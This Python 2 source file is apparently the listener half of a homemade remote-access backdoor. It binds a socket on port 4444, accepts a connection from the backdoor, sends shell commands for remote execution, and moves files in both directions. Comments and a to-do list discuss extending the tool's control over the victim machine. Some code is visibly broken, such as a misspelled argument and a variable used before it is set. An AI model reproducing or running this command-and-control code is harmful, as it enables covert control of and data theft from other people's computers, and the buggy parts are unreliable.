import socket, json, simplejson, sys, base64, re, zlib, linecache, os, tqdm

class Listener:
	def __init__(self, ip, port):
		self._buffer_size = 1024
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0) #backlog arg, no connections before connections refused
		print("[+] Waiting for incoming connections")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))


	## design scheme
	# use original features, encode entire file as json, send it bit by bit, receive it bit 
	# by bit, then when it has been completely recieved, start putting it back together and decoding it

	# will make one last ditch attempt at receiving using tqdm

	# stuff to add:
	# figure out how to get interactive programs working, like head, top, nano etc. Currently they just
		# hang up, probably due to some error in reliable receive on the listener. This one's probably going to be hard to figure out 
	# recursively send files from a supplied directory.
		# currently if I try to do this it create a blank file (however you'd define that in linux) with the name of the directory. Can already use the code from the spider to recursively search directories 

	def PrintException(self):
			exc_type, exc_obj, tb = sys.exc_info()
			f = tb.tb_frame
			lineno = tb.tb_lineno
			filename = f.f_code.co_filename
			linecache.checkcache(filename)
			line = linecache.getline(filename, lineno, f.f_globals)
			print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


	def reliable_send(self, data):
		json_data = json.dumps(data) #wrap data in json format
		self.connection.send(json_data.encode('latin1', errors='replace'))


	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(self._buffer_size)
				decoded_json = json_data.decode()
				return json.loads(decoded_json) #unwrap json data # seems to be hanging up here?
			except Exception:
				print("json data: " + str(json_data))
				self.PrintException()
				print "command hang"
				continue


	def json_encode(self, data):
		json_data = json.dumps(data) #wrap data in json format
		return json_data.encode('utf-8', erors='replace')


	def json_decode(self, json_data):
		decoded_json = json_data.decode() #wrap data in json format
		return json.loads(decoded_json)

	
	def fragmented_send(self, command, filename):
		'''
		open file, read through it 1024 bytes at a time, send those bytes, increment progress bar
		'''
		filesize = self.get_file_size(filename)
		upload_command = [command, filename]
		self.reliable_send(upload_command)
		progress_bar = tqdm.tqdm(range(filesize), "Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)

		with open(filename, "rb") as file:
			for i in progress_bar:
				bytes_read = file.read(self._buffer_size)
				self.connection.sendall(bytes_read)
				progress_bar.update(len(bytes_read))
			self.connection.send("TRANS_COM")



	def get_file_size(self, filename):
		return os.path.getsize(filename)

	
	def execute_remotely(self, command):
		print("remotely executing: " + str(command))
		self.reliable_send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.reliable_receive()


	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download successful"


	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	# buffer send: basically the backdoor has to have a means of recompiling the stream
	# since it is now sending fragmented json, will this even be valid json?

	def run(self):
		while True:
			command = raw_input(">> ") # NB just input for Python 3
			command = command.split(" ")
			try:
				# basically sends the file binary as if it was a command them the backdoor handles it as if it was a file, and writes it to the current directory. We want to be able to send the file in chunks and reassemble them
				if command[0] == "upload":
					self.fragmented_send(command[0], command[1])
					result = self.reliable_receive()
					print result
			
				elif command[0] == "download" and "[-] An error" not in result:
					result = self.write_file(command[1], result)
					print result
				else:
					result = self.execute_remotely(command) #will eventually return success message
					print result

			except Exception:
				print("[-] An error occured during execution on the listener")
				self.PrintException()

my_listener = Listener("192.168.1.145", 4444) 
my_listener.run()